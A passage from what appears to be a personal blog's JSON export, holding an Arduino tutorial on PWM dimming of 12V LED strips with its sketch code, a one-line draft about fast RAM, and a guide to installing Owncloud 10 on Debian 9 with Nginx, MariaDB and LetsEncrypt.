output values. //init to zero just to prevent errrors int outputValue1 = 0; int sensorValue2 = 0; int outputValue2 = 0; int sensorValue3 = 0; int outputValue3 = 0; int sensorValue4 = 0; int outputValue4 = 0; void setup() {     //initialize the serial interface at 9600 baud     Serial.begin(9600); } void loop() {     sensorValue1 = analogRead(PIN_INPUT_ONE);     sensorValue2 = analogRead(PIN_INPUT_TWO);     sensorValue3 = analogRead(PIN_INPUT_THREE);     sensorValue4 = analogRead(PIN_INPUT_FOUR); // the analogWrite function takes two values, an int for // the pin and an int for the value. The value MUST be an // 8-bit integer (0-255), and the analogRead function // returns a 10-bit value. The map() function is a handy // function built into the arduino library which handles // this smoothly.     analogWrite(PIN_OUTPUT_ONE, map(sensorValue1,0,1023,0,255));     analogWrite(PIN_OUTPUT_TWO, map(sensorValue2,0,1023,0,255));     analogWrite(PIN_OUTPUT_THREE, map(sensorValue3,0,1023,0,255));     analogWrite(PIN_OUTPUT_FOUR, map(sensorValue4,0,1023,0,255)); // these serial calls are to log the values. // They can be totally left out and the code will still function.     Serial.print(\\\"sensor val 1 @ \\\");     Serial.print(millis());     Serial.print(\\\" \\\");     Serial.println(sensorValue1);     Serial.print(\\\"sensor val 2 \\\");     Serial.println(sensorValue2);     Serial.print(\\\"sensor val 3 \\\");     Serial.println(sensorValue3);     Serial.print(\\\"sensor val 4 \\\");     Serial.println(sensorValue4); // A 2 millisecond delay to avoid glitches.     delay(2); }\\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>If you’ve hung out with me within the past few months, I’ve probably mentioned at some point some <a href=\"https://en.wikipedia.org/wiki/Light-emitting_diode\">LED</a> light strips. I discovered these while discussing lights I’m working on with some folks on #electronics on the <a href=\"https://en.wikipedia.org/wiki/Freenode\">Freenode</a> <a href=\"https://en.wikipedia.org/wiki/Internet_Relay_Chat\">IRC</a>. I had been discussing the fact with them that I had no way to reference how bright an LED would be when it got to me – I had no point of reference for various <a href=\"https://en.wikipedia.org/wiki/Lumen_(unit)\">lumen</a> or <a href=\"https://en.wikipedia.org/wiki/Candela\">candela</a> values, and I was worried that I would order dozens of individual LEDs, wire them up in a clever circuit, and discover they  weren’t bright enough to serve my purposes. They suggested to me that I look up surface-mounted (<a href=\"https://en.wikipedia.org/wiki/Surface-mount_technology\">SMD</a>) <a href=\"https://en.wikipedia.org/wiki/SMD_LED_Module\">LED</a> strips on eBay and the like. Oh man, what I found was a gold mine of possible uses. I got mine on <a href=\"https://www.banggood.com/5M-White-3528-SMD-LED-Strip-Light-Non-Waterproof-12V-DC-300-LED-p-77079.html\">BangGood</a>, although it can be purchased on <a href=\"http://www.ebay.com/itm/5M-SMD-3528-5050-5630-3014-300LEDs-RGB-White-LED-Strip-Light-12V-Power-Supply-US-/181435517609\">eBay</a> as well. The version I got was white (because who needs color control in a black and white film?), but they do sell <a href=\"https://www.banggood.com/5M-RGB-Non-Waterproof-300-LED-SMD-5050-LED-Strip-Light-DC-12V-p-925678.html\">RGB</a> versions for just a few bucks more. Actually, this… tutorial? article? whatever, applies better to the RGB version than to the white one, unless like me you want to separately control multiple light sources. More on that later. There are a few key features which make these specific lighting solutions versatile and very useful.</p>\n<ul>\n<li>Segmentation every five centimeters, with clear labels at one end and solder pads at both ends. This is also two inches, meaning they are easily used in projects for users who are familiar with metric or English measurements.</li>\n<li>Adhesive on the back</li>\n<li>Very bright, 3 LEDs per 5cm section.</li>\n<li>12V power supply.</li>\n</ul>\n<p>However, one thing makes it rather inconvenient compared to other LED solutions – it’s not dimmable. I wired the system up directly with a 500Ω <a href=\"https://en.wikipedia.org/wiki/Potentiometer\">potentiometer</a>, and it didn’t react well. At low <a href=\"https://en.wikipedia.org/wiki/Electrical_impedance\">impedance</a> (if you’re unfamiliar with a potentiometer, picture a volume knob turned all the way up), it would display its usual brightness – there was no more resistance than usual, as the pot was not causing a lot of resistance. However, when I turned the potentiometer’s knob to a higher impedance (again, you can picture a volume knob being turned down – the speakers, or in this case, lights, were recieving less current because the device was <em>impeding</em> that current), I was disappointed to see the lights stay at the same brightness part of the way to the high-impedance state, and then suddenly drop to a significantly lower brightness. There is an additional device attached to each 5cm section (aside from the 3 LEDs), which I initially thought to be a simple 150Ω resistor (it has a label 151, and I would be curious to find its actual function). It quickly became clear that that device served some other purpose than protecting the LEDs from excessive current – it regulates it. Alternatively, the LEDs themselves could have regulatory circuitry built in.</p>\n<p>Fortunately, there is a commonly known solution to the problem of needing to <em>effectively</em> dim something that can’t be dimmed. This process is known as <strong>P</strong>ulse-<strong>W</strong>idth <strong>M</strong>odulation. <a href=\"https://en.wikipedia.org/wiki/Pulse-width_modulation\">PWM</a> is when, instead of modulating how much current is going to a circuit by limiting the power getting to it (generally by increasing resistance – <a href=\"https://en.wikipedia.org/wiki/Ohm%27s_law\">Ohm’s law</a> states that increased resistance proportionally decreases power), a circuit is instead designed to pass the full amount of current to the device which does the work (in this case lights – and I’m just going to refer to them as such for the rest of this), for very brief periods of time. By varying the time during which the LEDs are <em>off</em>, which is too brief to actually see, you can effectively reduce overall amount of light reaching our eyes in a given period of time. This works especially well in film, because as long as your pulses are at least a few multiples of your frame rate your camera will not be able to see <em>any</em> pulsing. In my case, I expect a frame rate between 60 and 500 frames per second (or, you could think of it as hertz, if you want) and the Arduino Microcontroller I used functions at 16Khz. Even if you assume it switches only once every 10 clock cycles (it does so faster), that’s 1600Hz, which, even at the dimmest level, on the highest frame-rate (at which point the light would be practically invisible anyway), is plenty for these purposes.</p>\n<p>So – if the Arduino can do this PWM shit, why are you writing this lengthy article about it? Well, these light strips are powered by 12V at an unspecified amount of current, but the Arduino can only output 5V at 40 milliamperes – a measly 0.02 watts.  So, how do we get the Arduino to control a device which requires 100× the amount of current an Arduino can pass through it, or more? With one of the building blocks of modern computing – the transistor. There are a lot of different types of transistors, but the most common one is the NPN bipolar junction, which just so happens to be exactly what we need. You can get 4 transistors in one chip, I’m going to be ordering the STA412A tomorrow, which will have more than enough capability to amplify the minuscule current from the Arduino into something that can power the whole light strip. According to its <a href=\"http://www.semicon.sanken-ele.co.jp/sk_content/sta412a_ds_en.pdf\">datasheet</a>, pins 1 and 10 are the ground, pins 2, 4, 6, and 8 are going to be our inputs, and we can connect up to four light strips on pins 3, 5, 7, and 9. I wire my prototypes on a solderless breadboard, and then I will use a small solderable breadboard to build the final control module.</p>\n<p>I have several white light sources I want to control with this, but the ideal thing about using a 4×-chip like this is that then you can use this circuit to control the red blue and green values, giving you 256³ or <a href=\"https://en.wikipedia.org/wiki/Color_depth#True_color_.2824-bit.29\">16,777,216</a> color values to choose from, all controllable from the Arduino. Using a knob to dim lights that don’t like to be dimmed is just the very base use case for this particular circuit. You could modify the code slightly to accept input from other sources, like an <a href=\"https://playground.arduino.cc/Main/InterfacingWithHardware#Input\">I2C data line</a> or an <a href=\"http://www.ebay.com/itm/Ethernet-Shield-Lan-W5100-For-Arduino-Board-UNO-R3-ATMega-328-MEGA-1280-2560-/322267901919\">ethernet</a> connection. There are even <a href=\"https://smile.amazon.com/Makerfocus-1800MHz-1900MHz-Breadboard-Breakout/dp/B01NCNJOSI/\">modules</a> you can add to Arduino to let it receive text messages over-the-air  (OTA). One thing I plan on doing in the future is converting this same system to run from the Raspberry PI (which <a href=\"https://makezine.com/projects/tutorial-raspberry-pi-gpio-pins-and-python/\">also</a> has <a href=\"https://en.wikipedia.org/wiki/General-purpose_input/output\">GPIO</a> pins) and use it to control a backlight behind my TV based on… well I haven’t decided yet. I’d like it to respond to the colors of what was on the screen but I think it would be very difficult to find that information out from the system.</p>\n<p>Anyway, here’s the code:</p>\n<p>//constants for the pins const int PIN_OUTPUT_ONE = 3; const int PIN_OUTPUT_TWO = 5; const int PIN_OUTPUT_THREE = 6; const int PIN_OUTPUT_FOUR = 9; const int PIN_INPUT_ONE = A0; const int PIN_INPUT_TWO = A1; const int PIN_INPUT_THREE = A2; const int PIN_INPUT_FOUR = A3; //variables for the input and output values. //init to zero just to prevent errrors int outputValue1 = 0; int sensorValue2 = 0; int outputValue2 = 0; int sensorValue3 = 0; int outputValue3 = 0; int sensorValue4 = 0; int outputValue4 = 0; void setup() {     //initialize the serial interface at 9600 baud     Serial.begin(9600); } void loop() {     sensorValue1 = analogRead(PIN_INPUT_ONE);     sensorValue2 = analogRead(PIN_INPUT_TWO);     sensorValue3 = analogRead(PIN_INPUT_THREE);     sensorValue4 = analogRead(PIN_INPUT_FOUR); // the analogWrite function takes two values, an int for // the pin and an int for the value. The value MUST be an // 8-bit integer (0-255), and the analogRead function // returns a 10-bit value. The map() function is a handy // function built into the arduino library which handles // this smoothly.     analogWrite(PIN_OUTPUT_ONE, map(sensorValue1,0,1023,0,255));     analogWrite(PIN_OUTPUT_TWO, map(sensorValue2,0,1023,0,255));     analogWrite(PIN_OUTPUT_THREE, map(sensorValue3,0,1023,0,255));     analogWrite(PIN_OUTPUT_FOUR, map(sensorValue4,0,1023,0,255)); // these serial calls are to log the values. // They can be totally left out and the code will still function.     Serial.print(&quot;sensor val 1 @ &quot;);     Serial.print(millis());     Serial.print(&quot; &quot;);     Serial.println(sensorValue1);     Serial.print(&quot;sensor val 2 &quot;);     Serial.println(sensorValue2);     Serial.print(&quot;sensor val 3 &quot;);     Serial.println(sensorValue3);     Serial.print(&quot;sensor val 4 &quot;);     Serial.println(sensorValue4); // A 2 millisecond delay to avoid glitches.     delay(2); }</p>\n<p></p>\n</div>","amp":"332","plaintext":"If you’ve hung out with me within the past few months, I’ve probably mentioned\nat some point some LED [https://en.wikipedia.org/wiki/Light-emitting_diode] \nlight strips. I discovered these while discussing lights I’m working on with\nsome folks on #electronics on the Freenode\n[https://en.wikipedia.org/wiki/Freenode]  IRC\n[https://en.wikipedia.org/wiki/Internet_Relay_Chat]. I had been discussing the\nfact with them that I had no way to reference how bright an LED would be when it\ngot to me – I had no point of reference for various lumen\n[https://en.wikipedia.org/wiki/Lumen_(unit)]  or candela\n[https://en.wikipedia.org/wiki/Candela]  values, and I was worried that I would\norder dozens of individual LEDs, wire them up in a clever circuit, and discover\nthey  weren’t bright enough to serve my purposes. They suggested to me that I\nlook up surface-mounted (SMD\n[https://en.wikipedia.org/wiki/Surface-mount_technology]) LED\n[https://en.wikipedia.org/wiki/SMD_LED_Module]  strips on eBay and the like. Oh\nman, what I found was a gold mine of possible uses. I got mine on BangGood\n[https://www.banggood.com/5M-White-3528-SMD-LED-Strip-Light-Non-Waterproof-12V-DC-300-LED-p-77079.html]\n, although it can be purchased on eBay\n[http://www.ebay.com/itm/5M-SMD-3528-5050-5630-3014-300LEDs-RGB-White-LED-Strip-Light-12V-Power-Supply-US-/181435517609] \n as well. The version I got was white (because who needs color control in a\nblack and white film?), but they do sell RGB\n[https://www.banggood.com/5M-RGB-Non-Waterproof-300-LED-SMD-5050-LED-Strip-Light-DC-12V-p-925678.html] \n versions for just a few bucks more. Actually, this… tutorial? article?\nwhatever, applies better to the RGB version than to the white one, unless like\nme you want to separately control multiple light sources. More on that later.\nThere are a few key features which make these specific lighting solutions\nversatile and very useful.\n\n * Segmentation every five centimeters, with clear labels at one end and solder\n   pads at both ends. This is also two inches, meaning they are easily used in\n   projects for users who are familiar with metric or English measurements.\n * Adhesive on the back\n * Very bright, 3 LEDs per 5cm section.\n * 12V power supply.\n\nHowever, one thing makes it rather inconvenient compared to other LED solutions\n– it’s not dimmable. I wired the system up directly with a 500Ω potentiometer\n[https://en.wikipedia.org/wiki/Potentiometer], and it didn’t react well. At low \nimpedance [https://en.wikipedia.org/wiki/Electrical_impedance]  (if you’re\nunfamiliar with a potentiometer, picture a volume knob turned all the way up),\nit would display its usual brightness – there was no more resistance than usual,\nas the pot was not causing a lot of resistance. However, when I turned the\npotentiometer’s knob to a higher impedance (again, you can picture a volume knob\nbeing turned down – the speakers, or in this case, lights, were recieving less\ncurrent because the device was impeding  that current), I was disappointed to\nsee the lights stay at the same brightness part of the way to the high-impedance\nstate, and then suddenly drop to a significantly lower brightness. There is an\nadditional device attached to each 5cm section (aside from the 3 LEDs), which I\ninitially thought to be a simple 150Ω resistor (it has a label 151, and I would\nbe curious to find its actual function). It quickly became clear that that\ndevice served some other purpose than protecting the LEDs from excessive current\n– it regulates it. Alternatively, the LEDs themselves could have regulatory\ncircuitry built in.\n\nFortunately, there is a commonly known solution to the problem of needing to \neffectively  dim something that can’t be dimmed. This process is known asPulse-W\nidthModulation. PWM [https://en.wikipedia.org/wiki/Pulse-width_modulation]  is\nwhen, instead of modulating how much current is going to a circuit by limiting\nthe power getting to it (generally by increasing resistance – Ohm’s law\n[https://en.wikipedia.org/wiki/Ohm%27s_law]  states that increased resistance\nproportionally decreases power), a circuit is instead designed to pass the full\namount of current to the device which does the work (in this case lights – and\nI’m just going to refer to them as such for the rest of this), for very brief\nperiods of time. By varying the time during which the LEDs areoff, which is too\nbrief to actually see, you can effectively reduce overall amount of light\nreaching our eyes in a given period of time. This works especially well in film,\nbecause as long as your pulses are at least a few multiples of your frame rate\nyour camera will not be able to seeany  pulsing. In my case, I expect a frame\nrate between 60 and 500 frames per second (or, you could think of it as hertz,\nif you want) and the Arduino Microcontroller I used functions at 16Khz. Even if\nyou assume it switches only once every 10 clock cycles (it does so faster),\nthat’s 1600Hz, which, even at the dimmest level, on the highest frame-rate (at\nwhich point the light would be practically invisible anyway), is plenty for\nthese purposes.\n\nSo – if the Arduino can do this PWM shit, why are you writing this lengthy\narticle about it? Well, these light strips are powered by 12V at an unspecified\namount of current, but the Arduino can only output 5V at 40 milliamperes – a\nmeasly 0.02 watts.  So, how do we get the Arduino to control a device which\nrequires 100× the amount of current an Arduino can pass through it, or more?\nWith one of the building blocks of modern computing – the transistor. There are\na lot of different types of transistors, but the most common one is the NPN\nbipolar junction, which just so happens to be exactly what we need. You can get\n4 transistors in one chip, I’m going to be ordering the STA412A tomorrow, which\nwill have more than enough capability to amplify the minuscule current from the\nArduino into something that can power the whole light strip. According to its \ndatasheet [http://www.semicon.sanken-ele.co.jp/sk_content/sta412a_ds_en.pdf],\npins 1 and 10 are the ground, pins 2, 4, 6, and 8 are going to be our inputs,\nand we can connect up to four light strips on pins 3, 5, 7, and 9. I wire my\nprototypes on a solderless breadboard, and then I will use a small solderable\nbreadboard to build the final control module.\n\nI have several white light sources I want to control with this, but the ideal\nthing about using a 4×-chip like this is that then you can use this circuit to\ncontrol the red blue and green values, giving you 256³ or 16,777,216 color\nvalues to choose from, all controllable from the Arduino. Using a knob to dim\nlights that don’t like to be dimmed is just the very base use case for this\nparticular circuit. You could modify the code slightly to accept input from\nother sources, like an I2C data line  or an ethernet\n[http://www.ebay.com/itm/Ethernet-Shield-Lan-W5100-For-Arduino-Board-UNO-R3-ATMega-328-MEGA-1280-2560-/322267901919] \n connection. There are even modules\n[https://smile.amazon.com/Makerfocus-1800MHz-1900MHz-Breadboard-Breakout/dp/B01NCNJOSI/] \n you can add to Arduino to let it receive text messages over-the-air  (OTA). One\nthing I plan on doing in the future is converting this same system to run from\nthe Raspberry PI (which also\n[https://makezine.com/projects/tutorial-raspberry-pi-gpio-pins-and-python/]  has\n GPIO [https://en.wikipedia.org/wiki/General-purpose_input/output]  pins) and\nuse it to control a backlight behind my TV based on… well I haven’t decided yet.\nI’d like it to respond to the colors of what was on the screen but I think it\nwould be very difficult to find that information out from the system.\n\nAnyway, here’s the code:\n\n//constants for the pins const int PIN_OUTPUT_ONE = 3; const int PIN_OUTPUT_TWO\n= 5; const int PIN_OUTPUT_THREE = 6; const int PIN_OUTPUT_FOUR = 9; const int\nPIN_INPUT_ONE = A0; const int PIN_INPUT_TWO = A1; const int PIN_INPUT_THREE =\nA2; const int PIN_INPUT_FOUR = A3; //variables for the input and output values.\n//init to zero just to prevent errrors int outputValue1 = 0; int sensorValue2 =\n0; int outputValue2 = 0; int sensorValue3 = 0; int outputValue3 = 0; int\nsensorValue4 = 0; int outputValue4 = 0; void setup() {     //initialize the\nserial interface at 9600 baud     Serial.begin(9600); } void loop() {\n    sensorValue1 = analogRead(PIN_INPUT_ONE);     sensorValue2 =\nanalogRead(PIN_INPUT_TWO);     sensorValue3 = analogRead(PIN_INPUT_THREE);\n    sensorValue4 = analogRead(PIN_INPUT_FOUR); // the analogWrite function takes\ntwo values, an int for // the pin and an int for the value. The value MUST be an\n// 8-bit integer (0-255), and the analogRead function // returns a 10-bit value.\nThe map() function is a handy // function built into the arduino library which\nhandles // this smoothly.     analogWrite(PIN_OUTPUT_ONE,\nmap(sensorValue1,0,1023,0,255));     analogWrite(PIN_OUTPUT_TWO,\nmap(sensorValue2,0,1023,0,255));     analogWrite(PIN_OUTPUT_THREE,\nmap(sensorValue3,0,1023,0,255));     analogWrite(PIN_OUTPUT_FOUR,\nmap(sensorValue4,0,1023,0,255)); // these serial calls are to log the values. //\nThey can be totally left out and the code will still function.\n    Serial.print(\"sensor val 1 @ \");     Serial.print(millis());\n    Serial.print(\" \");     Serial.println(sensorValue1);\n    Serial.print(\"sensor val 2 \");     Serial.println(sensorValue2);\n    Serial.print(\"sensor val 3 \");     Serial.println(sensorValue3);\n    Serial.print(\"sensor val 4 \");     Serial.println(sensorValue4); // A 2\nmillisecond delay to avoid glitches.     delay(2); }","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-19T18:48:34.000Z","created_by":"1","updated_at":"2017-06-19T18:48:34.000Z","updated_by":"1","published_at":"2017-06-19T18:48:34.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332785","uuid":"b727693a-75c8-45fb-bd3b-34ef23005e0a","title":"Fast RAM","slug":"temp-slug-33","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI have seen listings online for insanely fast RAM\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I have seen listings online for insanely fast RAM</p>\n</div>","amp":"354","plaintext":"I have seen listings online for insanely fast RAM","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-21T19:11:18.000Z","created_by":"1","updated_at":"2017-06-21T19:11:18.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332786","uuid":"0ce71ec2-4b1d-48c7-aecb-79e2b5ac25f0","title":"Revised Owncloud setup for Debian 9 Stretch and Owncloud 10","slug":"revised-owncloud-setup-for-debian-9-stretch-and-owncloud-10","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThe instructions that are available online for Owncloud on LEMP are [*very*](https://www.howtoforge.com/running-owncloud-5.0-on-nginx-lemp-on-debian-wheezy) outdated, and I have written a [couple](https://madscientists.co/2017/02/05/some-notes-on-owncloud-setup-in-nginx/) of [articles](https://madscientists.co/2017/01/24/all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1/) prior to this about setup. Those are, unfortunately, already outdated with the release of Debian 9 *Stretch* and Owncloud 10. Owncloud is rather well documented, but their documentation relies on Apache, which I am [not a fan of](https://madscientists.co/2017/02/03/nginx-is-better-than-apache/). It’s not hard to piece together, but I figured I’d rewrite it all from scratch just to make it easy. This assumes you already have a Debian 9 system up and running with NginX and MariaDB 10. It’s not hard, you basically install the ‘nginx’ and ‘mariadb-common’ packages, and you’re ready. An interesting change in protocol from prior versions of MySQL/MariaDB – you no longer are prompted to set up a root password. Instead, only the root user on the system can access the MySQL root user. So instead of running ‘mysql -u root -p’, you should now run ‘sudo mysql’.\\n\\nThe php dependencies that you need to install prior to setting up are as follows, and can be installed through apt, aptitude, synaptic, apt-get, or apt-fast on Debian/Ubuntu.\\n\\nphp7.0-fpm ph7.0-cgi php7.0-xml php7.0-intl  php7.0-sqlite3 curl libcurl3 php7.0-curl\\n\\nYou need to quickly edit the configuration of php-fpm, by running *sudo nano /etc/php/7.0/fpm/pool.d/www.conf * and uncommenting the *env[VAL]=val* lines at the bottom of the config file, as suggested by [this](https://doc.owncloud.org/server/10.0/admin_manual/installation/source_installation.html#php-fpm-tips-label) documentation.\\n\\nThen, you should create a new MySQL user for the Owncloud installation – I wouldn’t want it to interfere with my WordPress installations. Also, if you have multiple instances of Owncloud, you’d want a separate database for each to avoid interference. Run ‘sudo mysql’ and then run the following SQL commands:\\n\\nCREATE USER owncloud_admin IDENTIFIED BY 'a sufficiently randomized password'; CREATE DATABASE owncloud; GRANT ALL PRIVILEGES ON 'owncloud.*' TO 'owncloud_admin'@'localhost' IDENTIFIED BY 'the password from before'; FLUSH PRIVILEGES;\\n\\nOnce you’ve done that, press Ctrl+D or type *quit* to exit the MySQL prompt, and then create a new NginX configuration for the Owncloud installation [based on mine](https://madscientists.co/paste/9z/).\\n\\nYou’re now ready to set up your SSL. [LetsEncrypt](https://letsencrypt.org/) is an excellent service that makes the incredibly important task of securing your connection to your server super-easy, and most importantly free. There are many other SSL services that would be within most people’s budgets, but I have not tried them, because I’m cheap. Anyway, it’s just like setting up SSL for any other site. My config file above has a few lines commented out. Make a directory in the webroot by either running “*sudo -u www-data mkdir $webroot/owncloud*” or “*sudo mkdir $webroot/owncloud && sudo chown -R www-data:www-data $webroot/owncloud*“. [Run the letsencrypt](https://madscientists.co/2017/02/05/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious/) command, then uncomment those commented lines and comment out or remove the “listen 80;” from the second server block. Make sure you do leave the directory empty and the commented blocks commented until LetsEncrypt can do it’s thing. Restart NginX and you’re ready.\\n\\nOkay, so all the prerequisites are ready, we’re ready for the actual Owncloud download. Go to the owncloud [download page](https://owncloud.org/install/), and under step 1, click download, then “Download OwnCloud Server”, then right click on the .tar.bz2 link and copy it. Open up a terminal to your server, navigate to your webroot, and run\\n\\nsudo -u www-data wget *owncloudDownloadLink*\\n\\nObviously you can then *tar xvf *the file and back it up and/or remove it from your webroot. Then navigate to the address you set up as the server_name in the NginX configuration and Owncloud will walk you through the setup.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>The instructions that are available online for Owncloud on LEMP are <a href=\"https://www.howtoforge.com/running-owncloud-5.0-on-nginx-lemp-on-debian-wheezy\"><em>very</em></a> outdated, and I have written a <a href=\"https://madscientists.co/2017/02/05/some-notes-on-owncloud-setup-in-nginx/\">couple</a> of <a href=\"https://madscientists.co/2017/01/24/all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1/\">articles</a> prior to this about setup. Those are, unfortunately, already outdated with the release of Debian 9 <em>Stretch</em> and Owncloud 10. Owncloud is rather well documented, but their documentation relies on Apache, which I am <a href=\"https://madscientists.co/2017/02/03/nginx-is-better-than-apache/\">not a fan of</a>. It’s not hard to piece together, but I figured I’d rewrite it all from scratch just to make it easy. This assumes you already have a Debian 9 system up and running with NginX and MariaDB 10. It’s not hard, you basically install the ‘nginx’ and ‘mariadb-common’ packages, and you’re ready. An interesting change in protocol from prior versions of MySQL/MariaDB – you no longer are prompted to set up a root password. Instead, only the root user on the system can access the MySQL root user. So instead of running ‘mysql -u root -p’, you should now run ‘sudo mysql’.</p>\n<p>The php dependencies that you need to install prior to setting up are as follows, and can be installed through apt, aptitude, synaptic, apt-get, or apt-fast on Debian/Ubuntu.</p>\n<p>php7.0-fpm ph7.0-cgi php7.0-xml php7.0-intl  php7.0-sqlite3 curl libcurl3 php7.0-curl</p>\n<p>You need to quickly edit the configuration of php-fpm, by running *sudo nano /etc/php/7.0/fpm/pool.d/www.conf * and uncommenting the <em>env[VAL]=val</em> lines at the bottom of the config file, as suggested by <a href=\"https://doc.owncloud.org/server/10.0/admin_manual/installation/source_installation.html#php-fpm-tips-label\">this</a> documentation.</p>\n<p>Then, you should create a new MySQL user for the Owncloud installation – I wouldn’t want it to interfere with my WordPress installations. Also, if you have multiple instances of Owncloud, you’d want a separate database for each to avoid interference. Run ‘sudo mysql’ and then run the following SQL commands:</p>\n<p>CREATE USER owncloud_admin IDENTIFIED BY 'a sufficiently randomized password'; CREATE DATABASE owncloud; GRANT ALL PRIVILEGES ON 'owncloud.*' TO 'owncloud_admin'@'localhost' IDENTIFIED BY 'the password from before'; FLUSH PRIVILEGES;</p>\n<p>Once you’ve done that, press Ctrl+D or type <em>quit</em> to exit the MySQL prompt, and then create a new NginX configuration for the Owncloud installation <a href=\"https://madscientists.co/paste/9z/\">based on mine</a>.</p>\n<p>You’re now ready to set up your SSL. <a href=\"https://letsencrypt.org/\">LetsEncrypt</a> is an excellent service that makes the incredibly important task of securing your connection to your server super-easy, and most importantly free. There are many other SSL services that would be within most people’s budgets, but I have not tried them, because I’m cheap. Anyway, it’s just like setting up SSL for any other site. My config file above has a few lines commented out. Make a directory in the webroot by either running “<em>sudo -u www-data mkdir $webroot/owncloud</em>” or “<em>sudo mkdir $webroot/owncloud &amp;&amp; sudo chown -R www-data:www-data $webroot/owncloud</em>“. <a href=\"https://madscientists.co/2017/02/05/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious/\">Run the letsencrypt</a> command, then uncomment those commented lines and comment out or remove the “listen 80;” from the second server block. Make sure you do leave the directory empty and the commented blocks commented until LetsEncrypt can do it’s thing. Restart NginX and you’re ready.</p>\n<p>Okay, so all the prerequisites are ready, we’re ready for the actual Owncloud download. Go to the owncloud <a href=\"https://owncloud.org/install/\">download page</a>, and under step 1, click download, then “Download OwnCloud Server”, then right click on the .tar.bz2 link and copy it. Open up a terminal to your server, navigate to your webroot, and run</p>\n<p>sudo -u www-data wget <em>owncloudDownloadLink</em></p>\n<p>Obviously you can then *tar xvf *the file and back it up and/or remove it from your webroot. Then navigate to the address you set up as the server_name in the NginX configuration and Owncloud will walk you through the setup.</p>\n</div>","amp":"358","plaintext":"The instructions that are available online for Owncloud on LEMP arevery\n[https://www.howtoforge.com/running-owncloud-5.0-on-nginx-lemp-on-debian-wheezy] \n outdated, and I have written a couple\n[https://madscientists.co/2017/02/05/some-notes-on-owncloud-setup-in-nginx/]  of\n articles\n[https://madscientists.co/2017/01/24/all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1/] \n prior to this about setup. Those are, unfortunately, already outdated with the\nrelease of Debian 9Stretch  and Owncloud 10. Owncloud is rather well documented,\nbut their documentation relies on Apache, which I am not a fan of\n[https://madscientists.co/2017/02/03/nginx-is-better-than-apache/]. It’s not\nhard to piece together, but I figured I’d rewrite it all from scratch just to\nmake it easy. This assumes you already have a Debian 9 system up and running\nwith NginX and MariaDB 10. It’s not hard, you basically install the ‘nginx’ and\n‘mariadb-common’ packages, and you’re ready. An interesting change in protocol\nfrom prior versions of MySQL/MariaDB – you no longer are prompted to set up a\nroot password. Instead, only the root user on the system can access the MySQL\nroot user. So instead of running ‘mysql -u root -p’, you should now run ‘sudo\nmysql’.\n\nThe php dependencies that you need to install prior to setting up are as\nfollows, and can be installed through apt, aptitude, synaptic, apt-get, or\napt-fast on Debian/Ubuntu.\n\nphp7.0-fpm ph7.0-cgi php7.0-xml php7.0-intl  php7.0-sqlite3 curl libcurl3\nphp7.0-curl\n\nYou need to quickly edit the configuration of php-fpm, by running *sudo nano\n/etc/php/7.0/fpm/pool.d/www.conf * and uncommenting theenv[VAL]=val  lines at\nthe bottom of the config file, as suggested by this documentation.\n\nThen, you should create a new MySQL user for the Owncloud installation – I\nwouldn’t want it to interfere with my WordPress installations. Also, if you have\nmultiple instances of Owncloud, you’d want a separate database for each to avoid\ninterference. Run ‘sudo mysql’ and then run the following SQL commands:\n\nCREATE USER owncloud_admin IDENTIFIED BY 'a sufficiently randomized password';\nCREATE DATABASE owncloud; GRANT ALL PRIVILEGES ON 'owncloud.*' TO\n'owncloud_admin'@'localhost' IDENTIFIED BY 'the password from before'; FLUSH\nPRIVILEGES;\n\nOnce you’ve done that, press Ctrl+D or typequit  to exit the MySQL prompt, and\nthen create a new NginX configuration for the Owncloud installation based on\nmine [https://madscientists.co/paste/9z/].\n\nYou’re now ready to set up your SSL. LetsEncrypt [https://letsencrypt.org/]  is\nan excellent service that makes the incredibly important task of securing your\nconnection to your server super-easy, and most importantly free. There are many\nother SSL services that would be within most people’s budgets, but I have not\ntried them, because I’m cheap. Anyway, it’s just like setting up SSL for any\nother site. My config file above has a few lines commented out. Make a directory\nin the webroot by either running “sudo -u www-data mkdir $webroot/owncloud” or “\nsudo mkdir $webroot/owncloud && sudo chown -R www-data:www-data\n$webroot/owncloud“. Run the letsencrypt\n[https://madscientists.co/2017/02/05/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious/] \n command, then uncomment those commented lines and comment out or remove the\n“listen 80;” from the second server block. Make sure you do leave the directory\nempty and the commented blocks commented until LetsEncrypt can do it’s thing.\nRestart NginX and you’re ready.\n\nOkay, so all the prerequisites are ready, we’re ready for the actual Owncloud\ndownload. Go to the owncloud download page [https://owncloud.org/install/], and\nunder step 1, click download, then “Download OwnCloud Server”, then right click\non the .tar.bz2 link and copy it. Open up a terminal to your server, navigate to\nyour webroot, and run\n\nsudo -u www-data wgetowncloudDownloadLink\n\nObviously you can then *tar xvf *the file and back it up and/or remove it from\nyour webroot. Then navigate to the address you set up as the server_name in the\nNginX configuration and Owncloud will walk you through the 